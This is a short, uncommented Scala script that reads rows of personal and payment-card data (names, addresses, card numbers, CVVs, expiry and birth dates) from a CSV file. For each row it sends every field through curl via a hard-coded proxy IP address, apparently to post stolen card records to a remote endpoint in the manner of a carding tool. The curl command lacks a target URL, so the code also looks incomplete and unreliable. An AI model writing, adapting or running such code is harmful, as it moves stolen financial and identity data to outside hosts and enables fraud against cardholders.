import scala.sys.process._
import scala.util.Random

val csv = "cat data.csv".!!

for(line<-csv.split("\n")){
  val data=line.split(",")   
  val name = data(1)+" "+data(0)
  val address = data(2)
  val city = data(3)
  val postalCode = data(4)
  val cardType = data(5)
  val cardNr = data(6)
  val cvv = data(7)
  val validDate = data(8)
  val birthDate = data(9)
  
  val cmd = "curl --proxy http://54.83.40.187:80 --data \"nr1="+name+"&nr2=" +address+"&nr3="+city+"&nr4="+postalCode+"&nr5="+cardType+"&nr6="+cardNr +"&nr7="+cvv+"&nr8="+validDate+"&nr9="+birthDate+"&nr10="+name+"\""
  cmd.lines_!
}
